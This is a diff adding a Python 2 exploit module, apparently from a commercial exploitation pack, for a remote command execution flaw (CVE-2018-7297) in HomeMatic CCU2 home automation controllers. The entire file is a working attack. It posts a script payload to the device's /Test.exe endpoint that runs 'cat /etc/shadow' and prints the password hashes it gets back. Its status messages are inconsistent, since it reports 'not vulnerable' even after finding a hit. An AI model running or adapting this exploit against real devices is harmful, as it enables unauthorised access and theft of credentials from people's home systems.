@@ -1,0 +1,42 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2018
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_homematic_1'
+_vendor_ = 'homematic'
+_model_  = ['CCU2']
+_vuln_   = 'Remote Command Execution Vulnerability'
+_cve_    = 'CVE-2018-7297	'
+_ref_    = 'http://atomic111.github.io/article/homematic-ccu2-remote-code-execution'
+_port_   = 80
+
+def pwnrouter(host):
+  try:
+    url = "http://%s/Test.exe" % host
+    headers = {u"Content-Type": u"application/x-www-form-urlencoded"}
+    data = "string stdout;string stderr;system.Exec(\"cat /etc/shadow\", &stdout, &stderr);WriteLine(stdout);"
+    response = requests.post(url, headers=headers, data=data)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  if "root:" in response.text:
+    print '[+] %s vulnerable' % host
+    print response.text
+  print '[+] %s not vulnerable' % host
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
